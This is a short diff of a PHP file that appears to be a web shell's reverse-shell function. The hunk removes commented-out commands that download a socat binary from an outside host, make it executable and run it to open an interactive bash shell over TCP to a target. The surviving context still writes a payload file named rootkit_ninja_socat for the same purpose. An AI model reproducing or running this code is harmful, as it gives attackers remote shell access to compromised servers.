@@ -185,11 +185,6 @@ function rs($s_rstype,$s_rstarget,$s_rscode){
 	elseif($s_lang=="elf"){
 		$s_fpath = "rootkit_ninja_socat";
 		if(is_file($s_fpath)) unlink($s_fpath);
-		// $s_result = exe("wget -q https://www.rootkit-ninja.com/tmp/socat -O ".$s_fpath);
-		// if(is_file($s_fpath)){
-		// 	$s_result = exe("chmod +x ".$s_fpath);
-		// 	$s_result = exe("./".$s_fpath." exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:".$s_rstarget);
-		// }
 		if($s_file=fopen($s_fpath,"w")){
 			fwrite($s_file,$s_fc);
 			fclose($s_file);
